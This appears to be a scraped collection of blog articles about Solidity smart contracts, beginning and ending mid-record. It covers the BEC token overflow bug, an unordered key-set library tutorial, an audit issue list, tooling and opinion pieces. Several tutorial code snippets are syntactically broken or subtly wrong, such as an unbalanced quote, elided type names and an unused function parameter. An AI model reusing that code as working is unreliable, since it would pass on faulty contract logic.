hacks occurred simply due to mistakes that programmers have made when writing lines of code in Solidity. For example, the Beauty Chain (BEC) was a high-profile cryptocurrency in China, which started trading on OKeX on February 23, 2018. It spiked 4,000 percent on the first day of trading. From its peak market cap of around $70 billion (USD), the price has gradually decreased to around $2 billion (USD) as of April 22, when its trading value suddenly dropped to zero. (OKEX since suspended trading of BECs.)This happened due to a bug in the BEC\u2019s ERC20 smart contract. In the case of BEC, the developer added a method called \u201cbatchTransfer()\u201d to the contract. The method is intended to facilitate token transfer to multiple parties at once (in other words, a batch).Image credit from the CVE-2018\u201310299 security\u00a0alertHowever, the developer made a crucial mistake in the following line of code:uint256 amount = uint256(cnt) * _value. (You can read more about this in Michael Yuan\u2019s Medium post.)Now what?A Solution for SolidityIn order to solve the real-world problems facing smart contracts written in Solidity, one impressive language called \u201cLity\u201d is being created for developing smart contracts across the CyberMiles blockchain, decentralized applications, and other customized blockchains. In particular, Lity aims to solve the performance and security issues facing Solidity.Lity consists of a dynamically extensible language, a compiler, and a virtual machine runtime, making it an evolution of the Solidity language. This means that all of the existing Solidity programs today can run without changes on the CyberMiles virtual machine (CVM).Another advantage of using Lity language is that it\u2019s more flexible than Solidity, more powerful and safer. For example, Lity supports new language functions and features that can be added over-the-air.In terms of performance, Lity extensions are for specific computing tasks and can be highly optimized. Known as \u201clibENI\u201d functions that are to be called from the CyberMiles virtual machine (CVM), this is executed as native code on the blockchain nodes.For example, public/private key algorithms are typically very slow and prohibitively expensive on the Ethereum network. Many classes of applications, such as most \u201cdata marketplaces\u201d, are practically impossible on Ethereum. With libENI, however, those operations take milliseconds (10,000 times faster) and require very low gas fees (a few cents, compare to the aforementioned $500 in gas fees to perform a cross-chain transaction).Lity\u2019s computational improvements have great implications on cross blockchain asset exchanges, as well as on incorporating off-chain data into blockchain transactions.Finally, the Lity compiler checks for compliance and known bugs in ERC 20 and ERC 721 contract code, while providing support for ERC 223 standard in ERC 20 contracts to prevent accidental token transfers to unsupported contract addresses. At the virtual machine level, Lity automatically prevents common issues such as integer overflow, or setting contract owner to nil.The Future of Smart ContractsUnfortunately, Solidity has become a source of blame for the errors found in today\u2019s smart contracts. In order to ensure the future of smart contracts, new programming languages like Lity are being developed.But make no mistake, the Ethereum Foundation is actively looking for ways to innovate on its own. Chief among them is working on the implementation of \u201cCasper\u201d and native contracts, the transition mechanism that eventually will migrate Ethereum to a PoS consensus method. The Ethereum Foundation believes this change is necessary to solve the various problems associated with PoW. The CyberMiles Foundation, for its part, already claims to have figured out the solution: a working DPoS model and its CVM, as litylang.org outlines. The race is on.While such modifications will mark a shift in one of the core technological elements that defines Ethereum today, its execution likely will have large implications for Ethereum, and particularly on its core components\u200a\u2014\u200asmart contracts.Read more of Rachel\u2019s articles on blockchain and cryptocurrency on ForbesFollow Rachel on Twitter at @Rachelwolf00", "responses": "1"}, {"title": "Solidity CRUD-\u00a0Epilogue", "author_name": "Rob Hitchens", "link": "https://medium.com/robhitchens/solidity-crud-epilogue-e563e794fde?source=search_post", "post_date": "Mar 27", "readtime": "9 min read", "upvotes": "96", "content": "Solidity CRUD-\u00a0EpilogueRob HitchensBlockedUnblockFollowFollowingMar 27A Reusable Implementation of the popular storage pattern for Ethereum.Photo by Jason Leung on\u00a0UnsplashI first wrote about Solidity CRUD in 2017. As expected, since that time I have found a lot of use-cases that call for something like Solidity CRUD to deal with dynamic sets in one way or another.By \u201cdynamic sets\u201d I refer to logical sets with members that come and go. Even though nothing is ever really deleted from Ethereum, there are plenty of cases where a contract needs a way to logically remove an item from a list.Many nasty coding challenges boil down to focusing on getting the data structure right. This, so the function implementations flow naturally. Through my training work at B9lab I\u2019ve found that getting a feel for storage structure is a challenge for even very experienced developers because this platform is very different from server-based storage.Certain themes emerge with repetition:Check existence.Ensure key uniqueness.Insert.Enumerate the members.Count.Remove.Solidity CRUD implements sets (tables, entities, collections if you prefer) with a three-part description:A struct with everything but the unique identifier. This struct contains a pointer to the unordered key index. The pointer is important for the delete process.An unordered key index with keys appended as instances (records, rows) are added. This is important for counting instances and enumerating the keys that exist in the set.A mapping that stores the structs so random access and existence checks are possible without iteration. (We don\u2019t like iteration. See Getting Loopy with Solidity.)With this data structure, all the concerns mentioned above are easily handled with one-step, a.k.a. \u201cO(1)\u201d, complexity. You get a storage layout that looks something like this:struct Object {  type name;  type name;  type name;  uint indexPointer;}mapping(bytes32 => Object) objects;bytes32[] objectList;Unordered Sets for Referential IntegrityI wrote about using such sets in a nested way to make a set of \u201cwhere used\u201d records in Enforcing Referential Integrity in Ethereum Smart Contracts,Suffice it to say that if a contract deals with multiple sets and they are related, things are going to get tedious. Here\u2019s the example I gave for a pair of tables with a one-to-many relationship.// first entity is called a \"One\"        struct OneStruct {        uint oneListPointer; // needed to delete a \"One\"        // One has many \"Many\"        bytes32[] manyKeys;         mapping(bytes32 => uint) manyKeyPointers;        // more app data    }        mapping(bytes32 => OneStruct) public oneStructs;    bytes32[] public oneList;        // other entity is called a \"Many\"        struct ManyStruct {        uint manyListPointer; // needed to delete a \"Many\"        bytes32 oneKey; // many has exactly one \"One\"        // add app fields    }        mapping(bytes32 => ManyStruct) public manyStructs;    bytes32[] public manyList;We want Ethereum contracts to be minimalist, clean, readable and importantly, we want to reduce cognitive overhead for both developers and reviewers\u200a\u2014\u200asimple, well-solved contracts so the workings of the contract are apparent to as many people as possible. Admittedly, nesting the pattern like that starts to push against those ideals.The LibraryLately, I\u2019ve been thinking about how to keep it DRY, as in \u201cDon\u2019t Repeat Yourself.\u201d There is a repeating pattern here:a set of keys, the treatment of which is completely consistent, andan application-level set of variables that could be anything at all, and is of no consequence to the logic that deals with the keys.We can clean this up by separating those concerns and implementing the repetitive part in a general-purpose UnorderedKeySet library.Libraries don\u2019t have state. They get that from the contracts that call them. When we implement the Solidity CRUD pattern using a library, our methods will be assigned to variables in the contract. If you\u2019re unfamiliar with libraries in Solidity, have a look at the official documentation and the popular SafeMath library.We Can Create a Set Type That Will Do Most of the\u00a0WorkWouldn\u2019t it be great to handle Solidity CRUD sets with a few concise methods? Even better, wouldn\u2019t it be great to know that we\u2019re working with a well-solved module that doesn\u2019t need customization?Long story, short, the HitchensUnorderedKeySet rolls up all the housekeeping and integrity concerns while ignoring the application-level variables.The library implements the Solidity CRUD pattern (I hacked out the error messages to make it little more Medium-friendly):import \"./Ownable.sol\";library HitchensUnorderedKeySetLib {        struct Set {        mapping(bytes32 => uint) keyPointers;        bytes32[] keyList;    }        function insert(Set storage self, bytes32 key) internal {        require(!exists(self, key));        self.keyPointers[key] = self.keyList.push(key)-1;    }        function remove(Set storage self, bytes32 key) internal {        require(exists(self, key)\");        bytes32 keyToMove = self.keyList[count(self)-1];        uint rowToReplace = self.keyPointers[key];        self.keyPointers[keyToMove] = rowToReplace;        self.keyList[rowToReplace] = keyToMove;        delete self.keyPointers[key];        self.keyList.length--;    }        function count(Set storage self) internal view returns(uint) {        return(self.keyList.length);    }        function exists(Set storage self, bytes32 key)         internal view         returns(bool)     {        if(self.keyList.length == 0) return false;        return self.keyList[self.keyPointers[key]] == key;    }        function keyAtIndex(Set storage self, uint index)         internal view         returns(bytes32)     {        return self.keyList[index];    }        function nukeSet(Set storage self) public {        delete self.keyList;    }}In the simple example, the contract is just maintaining a list of keys without any additional fields:contract HitchensUnorderedKeySet {        using HitchensUnorderedKeySet... for ... KeySetLib.Set;    HitchensUnorderedKeySetLib.Set set;        event LogUpdate(address sender, string action, bytes32 key);        function exists(bytes32 key) public view returns(bool) {        return set.exists(key);    }        function insert(bytes32 key) public {        set.insert(key);        emit LogUpdate(msg.sender, \"insert\", key);    }        function remove(bytes32 key) public {        set.remove(key);        emit LogUpdate(msg.sender, \"remove\", key);    }        function count() public view returns(uint) {        return set.count();    }        function keyAtIndex(uint index) public view returns(bytes32) {        return set.keyList[index];    }    }To my eye, that\u2019s a little easy to look at.Using the Library to Hold\u00a0RecordsYou can lay out mapped structs to hold data and it will still be easy to look at:contract Widget {        using HitchensUnordered... for ...KeySetLib.Set;    HitchensUnorderedKeySetLib.Set widgetSet;        struct WidgetStruct {        string name;        bool delux;        uint price;    }        mapping(bytes32 => WidgetStruct) widgets;Functions are intuitive enough, and since the library is overseeing key insertions and removals, most of the \u201cchecks\u201d are done for you:function newWidget(  bytes32 key,   string memory name,   bool delux,   uint price)   public {  widgetSet.insert(key);  WidgetStruct storage w = widgets[key];  w.name = name;  w.delux = delux;  w.price = price;  emit LogNewWidget(msg.sender, key, name, delux, price);}The insert() method will fail if the key to insert already exists. As a \u201cpublic service announcement\u201d, if you\u2019re unfamiliar with storage pointers, read this.Simplified Expression of RelationshipsThe improved readability of this approach starts to shine in cases where there is a lot going on. Consider a contract with Red Teams and Blue Teams that form inside Games. Imagine each Player is a struct with properties like all-time achievement, privileges, etc.\u200a\u2014\u200aproperties that are important for contract logic.Such a thing would have more moving parts than the simple one-to-many example, so we would expect the long-hand form of the functions to get even more busy. That\u2019s not ideal. The library let\u2019s us say it more concisely, which is what we want because it means less opportunity for oversight to creep in.Consider the hypothetical structure of a Game:HitchensUnorderedKeySet.Set gameSet;struct GameStruct {  HitchensUnorderedKeySet.Set redTeam;  HitchensUnorderedKeySet.Set blueTeam;  // carry on about the game}mapping(bytes32 => GameStruct) games;We said a lot there.Games are known by unique identifiers and contain two sets of players for the two teams. We can give the players the same treatment and easily enforce a rule to ensure that players need to exist before joining a Game team (if we need to). Players can be on different teams for different games at the same time.Keeping in mind that state doesn\u2019t need to contain data unless it\u2019s logically important to a contract, we can consider that \u201cWhere Used\u201d is often important. For example\u2019s sake, let\u2019s say we want each player to encapsulate the games participated in.HitchensUnorderedKeySet.Set playerSet;struct PlayerStruct {  HitchensUnorderedKeySet.Set gameSet;  // carry on about the players}mapping(bytes32 => PlayerStruct) players;That was almost too easy. We now have a \u201cWhere Used\u201d list so we can know which players must not be deleted: Two-way bindings with concise code. Nice.By the way, since the library always uses bytes32keys (because bytes32 can hold the types we should want to use for a key) you can use helper functions to convert to/from address. The expressions are easily coded into pure functions in your contract:function addressToBytes32(address a) public pure returns(bytes32) {  return bytes32(uint(uint160(msg.sender)));}function bytes32ToAddress(bytes32 b) public pure returns(address) {  return address(uint160(uint(key)));}Consider using a hash function for bytes and strings if you really need to use those for keys.Inserting Into Related\u00a0RecordsLet\u2019s carry on. If we want to push a player into a team in a game and we wish to maintain the above-mentioned bi-directional pointers, it would look something like:function joinGame(bytes32 gameId, bool team)...{  require(playerSet.exists(msg.sender), \"Register please\");  require(gameSet.exists(gameId), \"Not a game\");  GameStruct storage g;  PlayerStruct storage p;  if(team) g.redTeam.insert(msg.sender);  if(!team) g.blueTeam.insert(msg.sender);  p.insert(gameId);  emit ...}Did you notice the bi-directional binding? We\u2019re populating both the game players and the player games. We also addressed an implied requirement. A player can\u2019t join a game twice, not even on opposite teams because the last insert() would fail the uniqueness test. Pick a team, Alice!We can easily check all sorts of things that might be important at an application level.Are you on the red team?require(g.redTeam.exists(msg.sender), \"You're not on the red team\");How many players are on the blue team?return g.blueTeam.count(); // how many players are there?Who is on the blue team?return g.blueTeam.keyAtIndex(row); // where row is a uint < count()The higher level of abstraction means more thinking about what the application should do and less anxiety about what the contract actually does.DeleteWe can also decide what we want to do about deletes. We have some flexibility here.In the case that a player wants to quit a team, we have to dismantle whatever relationships we assembled in the insertion process. Remove the player from the game and remove the game from the player.Maybe something like:function quitTeam(bytes32 gameId, bool team) public {  GameStruct storage g = games[gameId];  PlayerStruct storage p = players[msg.sender];  if(team) g.redTeam.remove(msg.sender);  if(!team) g.blueTeam.remove(msg.sender);  p.remove(gameId);  emit ...}Again, the library will revert transactions in case the input is nonsense, because it doesn\u2019t remove() keys that don\u2019t exist. This catches non-existent games and players who aren\u2019t on the teams, without any help from us.Cascade DeleteOr, we can do a cascade delete and obliterate heavy structures.As always, it would be a bad idea to delete a master record when other records depend on it. You would want to prevent that with something like:require(relatedSet.count() == 0, \u201cSomething depends on this.\");But, if a big structure was built up\u00a0\u2026HitchensUnorderedKeySet.Set myBigThingSet;struct MyBigThing {  HitchensUnorderedKeySet.Set aBigSet;  HitchensUnorderedKeySet.Set anotherBigSet;  HitchensUnorderedKeySet.Set yetAnotherBigSet;  HitchensUnorderedKeySet.Set whereUsedElsewhere;}mapping(bytes32 => MyBigThing) myBigThings;\u2026 and you want it gone:myBigThing storage t = myBigThings[key];require(t.whereUsedElsewhere.count() == 0, \"Relational Integrity.\");myBigThingSet.remove(key);delete myBigStructs[key];The remove() function ensures the key exists so we don\u2019t have to. The first three sets could contain considerable information, and this deletes it all in one move. Although there is gas refund for removing non-zero value from storage, delete will not recurse to fully realize the potential. Have a look here for an interesting detail about garbage collection (or the lack thereof):Is it possible to access the mapping of a deleted structThanks for contributing an answer to Ethereum Stack Exchange! Please be sure to answer the question. Provide details\u2026ethereum.stackexchange.comThe existence of uncollected garbage doesn\u2019t effect the nature of the logical delete, so it can be generally ignored. There may be an opportunity to be a good citizen and clean up more effectively and earn gas refunds by releasing storage.Reset All Values in\u00a0MappingLogical sets are useful for addressing difficult problems. For example, have a look at this question about resetting all of the values in a mapping. There is no efficient way to do that as worded, but logical sets can produce the desired effect with ease:Reset all values in a mappingFor resetting the balance stored in mapping, you have to record the mapping entries, because you cannot use\u00a0.length\u2026ethereum.stackexchange.comOverwrites are Out Of\u00a0ScopeOverwrites to your own mapped structs are out of scope for three reasons:They are not about key lists, by definition.The library would need knowledge about the layout to present an appropriate function interface and that will be different for every application.It\u2019s trivial to add an existence check at the application level, as shown in the updateWidget() function in the example. Remember to check exists(key). It may help to notice that if you miss that step, then your update function won\u2019t consult the library at all. That should feel wrong.Stay tuned for another library that will further generalize storage, including updates and application-level fields. Not the last storage solution you will ever need, but a step in that direction.Complete ExamplesThe code repo contains two examples. The library itself contains a minimal contract so you can load it Remix and experiment with the raw library functions. There is also a Widget Example to show a more fleshed out implementation.Enjoy!Rob Hitchens is a Canadian smart contract design consultant, co-founder of Ethereum smart contract auditor Solidified.io and a courseware co-author and mentor of Ethereum, Hyperledger Fabric, Hyperledger Sawtooth Lake, Corda, Quorum and Tezos bootcamps by B9lab.", "responses": "2"}, {"title": "Team Interviews: Bingen, Aragon\u2019s Solidity\u00a0Engineer", "author_name": "Tatu K\u00e4rki", "link": "https://medium.com/aragondec/team-interviews-bingen-aragons-solidity-engineer-9ae1bf9814fc?source=search_post", "post_date": "Feb 21, 2018", "readtime": "8 min read", "upvotes": "179", "content": "Team Interviews: Bingen, Aragon\u2019s Solidity\u00a0EngineerBingen is a developer and an open source advocate joining Aragon to make the world a better\u00a0placeTatu K\u00e4rkiBlockedUnblockFollowFollowingFeb 21, 2018Today our Team Interview is with Bingen, Aragon\u2019s new Solidity Engineer\u200a\u2014\u200awe talked about his interest to make the world a better place through Aragon, and what are his thoughts on Ethereum.Past team interviews:Luis| Jorge | Tatu | Mar\u00eda | Luke | Pierre | John | Brett | Alexa", "responses": ""}, {"title": "Solidity 101: Intro to Ethereum Smart Contracts and\u00a0Solidity", "author_name": "Kambria @ www.kambria.io", "link": "https://medium.com/kambria-network/solidity-101-intro-to-ethereum-smart-contracts-and-solidity-82e9889b1736?source=search_post", "post_date": "Nov 8, 2017", "readtime": "6 min read", "upvotes": "263", "content": "Solidity 101: Intro to Ethereum Smart Contracts and\u00a0SolidityA beginner\u2019s guide to the programmable blockchainKambria @ www.kambria.ioBlockedUnblockFollowFollowingNov 8, 2017Ethereum is the new programmable money.By the end of this article, you\u2019re going to know how to write simple Ethereum smart contracts using the Remix\u200a\u2014\u200aSolidity IDE", "responses": "1"}, {"title": "The Complete Developers Guide to Building on Snowflake: Part 1\u200a\u2014\u200aSolidity", "author_name": "Andy Chorlian", "link": "https://medium.com/hydrogen-api/the-complete-developers-guide-to-building-on-snowflake-part-1-solidity-329078776741?source=search_post", "post_date": "Aug 31, 2018", "readtime": "4 min read", "upvotes": "339", "content": "The Complete Developers Guide to Building on Snowflake: Part 1\u200a\u2014\u200aSolidityAndy ChorlianBlockedUnblockFollowFollowingAug 31, 2018This is going to be an in-depth guide on how to build an Ethereum dApp that fully utilizes the functionality of Snowflake. I will cover both the backend (Solidity) and the frontend (React).Getting StartedTo follow along with this guide you are going to need a few things:I would recommend that you have at least some experience building dApps with Solidity.A general knowledge of React (I just learned it last month. Knowing Javascript should be fine if you are good at learning on the fly).A Github account.To get a working proof of concept for a dApp is really going to depend on how complicated your application is and the scope of what you are doing in the app. For a basic dApp, all of this can certainly be done in a days work.You will also need to acquire Rinkeby Testnet Ether and Hydro.To acquire Testnet Ether, follow the steps in this StackExchange answer:How do I \"Buy\" tokens on the Rinkeby (test) environment?RinkedBy official faucet uses 3rd party social network to prevent malicious actors. You only need to go to this page\u2026ethereum.stackexchange.comTo acquire Testnet Hydro, connect your Rinkeby account from MetaMask on this page:Rinkeby Accounts, Address and ContractsSource Code Copy Find Similiar Contracts pragma solidity ^0.4.18; /** * @title Ownable * @dev The Ownable contract has\u2026rinkeby.etherscan.ioand \u201cwrite\u201d the getMoreTokens function, which is a function on the Rinkeby version of the HYDRO token contract that creates 10,000 HYDRO and pulls it into your wallet.Smart ContractSnowflake, is currently live on Rinkeby and allows for developers to leverage a few key features that we feel really help the development process. Some of these key features are:Multiple addresses linked to an accountEasy access to integrating token economics into any dAppUser sign up and account deletionAccess to a dApp store for all Snowflake users for visibilityIn order to leverage these capabilities it is important that all smart contracts inherit the Snowflake Resolver contract. This contract implements all of the required functionality that is needed to be a resolver. Here is a basic contract which is implementing the Snowflake Resolver contract and utilizing some of its logic.Lets take a look at whats going on here:Line 12: Setting this variable to true tells the Snowflake contract that we have custom sign up logic.Lines 22 & 44: Here we have the onSignUp function. This function is called automatically when a Snowflake user sets your dApp. For each dApp this logic will need to be custom based on the needs of the dApp. In our example, we are just taking the HydroID that is passed to us and checking if they are already a member. If they are, then they can\u2019t sign up again. If they aren\u2019t we add them as a member.Here is an example of an onSignUp function which is also utilizing the Hydro allowance to charge users a fee:The sign up is attempting to withdraw the signUpFee variable from the users Snowflake balance. If this is not successful, the user cannot use the dApp. This withdraw functionality can be used all throughout your dApp. As long as the user has set an allowance for your dApp in their Snowflake they will be able to easily transfer you Hydro and you won\u2019t have to ever worry about calling approveAndCall again!!", "responses": ""}, {"title": "Solidity Compiler\u00a0Audit", "author_name": "Zeppelin", "link": "https://blog.zeppelin.solutions/solidity-compiler-audit-8cfc0316a420?source=search_post", "post_date": "Nov 1, 2018", "readtime": "5 min read", "upvotes": "263", "content": "Solidity Compiler\u00a0AuditZeppelinBlockedUnblockFollowFollowingNov 1, 2018The Augur team and the Ethereum Foundation (through a joint grant) asked us to review and audit the Solidity compiler. We looked at the code and now publish our results.The audited project can be found in the ethereum/solidity GitHub repository. The version used for this report is commit e67f0147998a9e3835ed3ce8bf6a0a0c634216c5 (tag v0.4.24).The full report can be found here, and a list of the issues ordered by severity can be found next.Critical SeverityCRITICAL: Incorrect library addresses can be injected while linking.CRITICAL: Comments can be disguised as executable code.High SeverityHIGH: Model is very complex and could use more documentation.HIGH: Known issues only emit warnings for backwards compatibility.HIGH: There is no report of unit test coverage.HIGH: Low unit test coverage.HIGH: All strings are UTF-8.HIGH: Modifiers can be overridden with no special syntax or warnings.HIGH: solc-js output with optimizations is non-deterministic in some environments.HIGH: No error message on uninitialized storage references.HIGH: Missing return statement on a function does not issue an error.HIGH: Fuzzing setup is broken.Medium severityMEDIUM: Insecure system call may lead to command execution.MEDIUM: Swarm hash implementation is outdated.MEDIUM: Fallback mechanism in imports is not working properly.MEDIUM: Coinspect audit still has unaddressed issues.MEDIUM: Bus factor is 2.MEDIUM: There is no code of conduct.MEDIUM: There is no clear test structure.MEDIUM: There is no intermediate language.MEDIUM: The syntax for the fallback function is prone to confusion.MEDIUM: Some public functions cannot be made external.MEDIUM: State variables can be shadowed.MEDIUM: Optional optimizations may not be safe.MEDIUM: Optimizations code in the assembler (libevmasm) is hard to read.MEDIUM: Fragile code in the CSE optimizer.MEDIUM: All optimizations are very low level.MEDIUM: Modifiers can return.MEDIUM: No error when externally calling contract code from a constructor.MEDIUM: No dead code warning.MEDIUM: Crash when trying to declare an already declared variable with the same name.MEDIUM: Crash when converting signed rational using ABIEncoderV2Low severityLOW: Coding style hinders readability and may lead to programming errors.LOW: Insecure string handling.LOW: The quality of sourcemaps could be improved.LOW: There are many assertThrow usages without a messageLOW: Storage of small value types is unnecessarily costly.LOW: There are issues tagged as Soon that have not been updated in a long time.LOW: There are many untriaged issues.LOW: There are few issues tagged as Good first issue.LOW: There are many open pull requests with multiple comments.LOW: There are many stale branches.LOW: There is no stable release cadence.LOW: There is no site for news about the project.LOW: There is a lot of inconsistency on the Julia, IULIA, Yul name.LOW: The status of Yul is not clear.LOW: The main project README is missing important information.LOW: The main page of the user documentation has many links.LOW: It is unclear which files are included in a GitHub release.LOW: Whiskers is documented as part of the contribution guidelines.LOW: The process for helping with translations is not documented.LOW: Documentation translations are hosted on independent sites.LOW: There is no documentation explaining how to help testing the nightly build.LOW: There is no documentation on how tests are run on Continuous Integration.LOW: There is no clear documentation for experimental features.LOW: No documentation available for libsolc.LOW: README for Yul optimizations is incomplete.LOW: Missing information for successfully building Solidity\u2019s fuzzer AFL.LOW: soltest custom command line arguments are not listed in help.LOW: There is no clear documentation about the constructor not being part of the deployed code.LOW: Contracts from external projects are duplicated in the Solidity code repository.LOW: Some tests are run twice on different Continuous Integration systems.LOW: There are no static tests enforcing a consistent code style.LOW: It is very difficult to run tests locally.LOW: Building in some Linux distributions fails.LOW: Missing file on compilation when using SANITIZE.LOW: Insecure environment variable handlingLOW: No errors on missing output option.LOW: Inconsistent AST output.LOW: Confusing options naming.LOW: Undocumented clone contract feature.LOW: General CLI inconsistencies and confusing options.LOW: No mechanism to prevent functions from being overridden.LOW: Invalid UTF-8 sequences are allowed in comments.LOW: It is not possible to declare constant variables inside functions.LOW: Base fallback function cannot be extended.LOW: No mechanism to ensure abstract contracts.LOW: Low coverage for optimization-specific end-to-end tests.LOW: Erroneous mutability detection when dead code is involved.LOW: Misleading error message on overload resolution failure.LOW: Misleading error when externally referencing a state variable.LOW: Misleading error when internally calling an external function.LOW: Fuzzer.cpp and solfuzzer have counterintuitive naming.LOW: AFL example from the documentation doesn\u2019t work.LOW: Fuzz testing scheduling and visibilityLOW: Crash when requested type is not present.LOW: Crash when accessing empty name variable slot.LOW: Crash when type not set for parameter return value.LOW: Crash when type not set for parameter function value.LOW: Crash when accessing a _slot of a function in assembly block.LOW: Crash when calling a non callable type on a non primitive type double assignment.LOW: Crash when using assembly jump instruction inside a constructor or function with same name as contract.LOW: Crash when declaring external function with array of struct that possesses arrays.LOW: Crash when using struct as external function parameter using ABIEncoderV2.LOW: Crash when converting fixed point type using ABIEncoderV2.LOW: Crash when array index value is too large.LOW: High CPU usage on conversion between numeric literal and others.LOW: High CPU usage when using large variable names.NotesNOTE: Non-functional requirements.NOTE: Micropayment Channel example is not written.NOTE: Consider reviewing the language design process and adding high-level goals.NOTE: Tests hang if cpp-ethereum is not in $PATH.NOTE: The help string for the\u200a\u2014\u200alibraries option is wrong.NOTE: The deprecated var keyword is documented.NOTE: Deprecated constructors found in examples.NOTE: Warnings for unassigned arrays are not truncated.\u200b\u200b\u200bConclusionsTwo critical severity and ten high severity issues were found and explained, along with recommendations on how to fix them. Some additional changes were proposed to follow best practices and reduce potential attack surface.Update: All critical and high severity issues were fixed or addressed by the Solidity team.If you are interested in smart contract security, you can continue the discussion in our forum, follow us on Medium, or even better, join the team\ud83d\ude80. If you are buidling a project of your own and would like to request a security audit, please do so here.", "responses": ""}, {"title": "Blockwatch: Tools for Working With\u00a0Solidity", "author_name": "Chris Chinchilla", "link": "https://hackernoon.com/blockwatch-tools-for-working-with-solidity-fc2620de559f?source=search_post", "post_date": "Dec 4, 2017", "readtime": "4 min read", "upvotes": "90", "content": "Blockwatch: Tools for Working With\u00a0SolidityChris ChinchillaBlockedUnblockFollowFollowingDec 4, 2017Recently a group of Blockchain enthusiasts at the co-working space I occasionally work from decided that it was time we stopped talking about Blockchain and actually learned how to create something based on it.We wanted to create a coin or token for the community to use internally, and whilst the project has stalled for now, I started investigating Ethereum in more depth, and the language it uses for creating smart contracts, Solidity. I will cover the language itself in more detail in the future (when I understand it more myself!), but in this post, I will cover some of the tools available for working with the language.Your Language of\u00a0ChoiceYour starting point is the official Ethereum clients, available for all operating systems and in Go, C++, Rust, and Python. All support the full breadth of classes and methods for Solidity and many of the other tools listed here will need them as dependencies.There is an unofficial client for JavaScript. The repository I linked to is out of date, but it contains a useful reference to where to now find the libraries you need.RemixMix promised to be a fully-fledged Solidity IDE, but it never materialized and Remix is its the web-based alternative. You can lint, compile, debug, run, and analyze your Solidity code based on different versions of the Ethereum compiler. You can also run your own local copy of Remix in the browser, or as a browser extension.WalletsThe official Ethereum wallet and mist applications allow you to deploy contracts to networks, but not much else, so you should make sure your code is finished before using them.JetBrains IDEsIf you use any of the IDEs based on the IntelliJ platform, then there\u2019s a plugin available that supports formatting, snippets, and code completion.Eclipse IDEPapyrus is a UML modeling environment for the Eclipse IDE (and the Oxygen XML editor), and uml2solidity is a plugin for Papyrus that lets you convert UML models to Solidity. For experienced programmers who are new to smart contracts, this is a great way to model your ideas in languages that are familiar to you.AtomI am a big Atom fan, so I was delighted to find a selection of packages available with Solidity support.There\u2019s the Solidity linter based on coding standards from the solc npm package, and the solium linter based on the solium project. They take different approaches to configuration, linter-solidity has far more users, and I couldn\u2019t even get linter-solium to work, so that may make deciding between the two an easy choice. And finally, there\u2019s autocomplete for Solidity and language-ethereum that adds support for Solidity and Serpent, another language you can use for creating smart contracts.The etheratom package lets you compile and deploy Solidity code from the editor, but it\u2019s complicated to setup and you have to know what you\u2019re doing as it requires several Ethereum related tools to already be installed, and working, on your machine.Deployment FrameworksYou know when the development community has started to accept a language when it starts creating frameworks for it. Unsurprisingly Ethereum has a couple of options.Truffle claims to be the most popular option, supporting compilation, testing, deployment, and dependency management.Embark is similar, and also offers integration with IPFS for storage-based solutions and whisper or orbit for communications-based applications.Dapp is a simpler CLI tool for package management, testing, and deployment of smart contracts.For more enterprise-like projects, BlockApps offers a full-stack platform for creating private blockchain applications that promise to fit into any of your existing toolchains.An Ecosystem of Constant\u00a0ChangeThe blockchain space is in constant flux and thus a list of tools will not be comprehensive for the foreseeable future. If there\u2019s anything missing from this list, please add it to the comments below.", "responses": ""}, {"title": "Solidity\u2019s biggest bug: Javascript", "author_name": "Karl Floersch", "link": "https://medium.com/@karl_dot_tech/soliditys-biggest-bug-javascript-be5c4f3520a5?source=search_post", "post_date": "Apr 25, 2016", "readtime": "3 min read", "upvotes": "61", "content": "Solidity\u2019s biggest bug: JavascriptKarl FloerschBlockedUnblockFollowFollowingApr 25, 2016Reliance on Javascript is stunting the growth of the Solidity development ecosystem. It\u2019s why new developers get stuck. It\u2019s why we struggle integrating Solidity into development environments. And it\u2019s why much of our documentation is out of date. We are stuck in our Javascript mindstate because we don\u2019t treat Solidity like it\u2019s a real language.This begins with how we teach Solidity to new developers. First, we explain Bitcoin, Ethereum, blockchain, and smart contracts. Next we show them the SimpleStorage smart contract. It all makes sense until we start adding Javascript into the mix. We begin explaining web3 and how to make your SimpleStorage GUI.What happened? Are we trying to teach smart contract development or how to build GUIs? Imagine trying to learn Solidity as your first programming language, and then getting told you have to know Javascript too. That would give me nightmares.Solidity is constantly treated as a second class language.This is not just a problem for newbies. Seasoned developers spend weeks on-boarding before they write a single smart contract. Instead of learning Solidity, they spend their time debugging web3 issues.Personally, I spent over a month trying to integrate Ethereum development tools with my React/webpack frontend enviornment. Project after project I kept hitting walls that I didn\u2019t quite understand. That is, until I realized I had just spent weeks on my tooling with no smart contracts to show for it (talk about Javascript tool fatigue). Trying to couple my Solidity development enviornment to my Javascript frontend caused me nothing but pain.Coupling our Javascript and Solidity environments also causes documentation problems. Most of our \u201cSolidity\u201d tutorials don\u2019t actually cover language features. Instead they focus on Javascript integration tools which are in constant flux. We document high level abstractions instead of core functionality. It\u2019s like living in a world where Angular.js is documented better than Javascript.Because flashy GUIs provide great press, and CLIs only get Vim-users excited, Ethereum devs have been focusing on frontends. It\u2019s natural then that we tack-on smart contracts to our Javascript frontend workflows. We just throw the\u00a0.sol files into a /contracts directory and call it a day. But this strategy doesn\u2019t scale. For dapps to move out of the prototype phase we will need mature tools which reduce the complexity of large smart contract systems.There\u2019s still\u00a0hopeWe can still fix this. We need to treat Solidity like a real language and develop tools for Solidity developers not just for the Javascript developer dabbling in Solidity. There are a few areas which require the most attention:Solidity Learning Resources: More comprehensive learning resources that focus on Solidity. This could include a Hello World app that prints \u2018Hello World\u2019 to the console using events. Having tutorials that cover Solidity basics, up to advanced design patterns will do wonders for our community.Solidity Package Manager: Smart contracts on Ethereum all execute within a shared runtime. This provides great opportunities for code reuse, but somehow we still don\u2019t have a good package manager. npm empowered the Javascript community to share and reuse code. The Solidity development ecosystem needs it\u2019s equivalent.Solidity Unit Testing: It\u2019s common practice to test contracts with Javascript testing libraries. This practice introduces implicit dependencies (e.g. RPC connectivity), requires context switching, and is difficult for non-Javascript developers. Instead, for reliable unit tests, we need powerful Solidity unit testing frameworks. We need the Chai and Mocha for Solidity.Solidity development is wonderfully greenfield and I haven\u2019t covered most of what needs to be built. But that\u2019s what makes this field so exciting. Every developer can make a huge impact. But for us to make the most impact, we need to stop building around the problem and attack it at it\u2019s heart: the Solidity language.Our ecosystem is already maturing. But it would progress much faster if we stopped using Javascript as a crutch. We would soften the learning curve, empower developers, and push our ecosystem forward. Just because Solidity is resource constrained, doesn\u2019t mean it should be treated as a second class language. If the Ethereum computer is going to change the world, it will need the most vibrant developer ecosystem supporting it.Let\u2019s drop Javascript reliance like semicolons and take Solidity to the 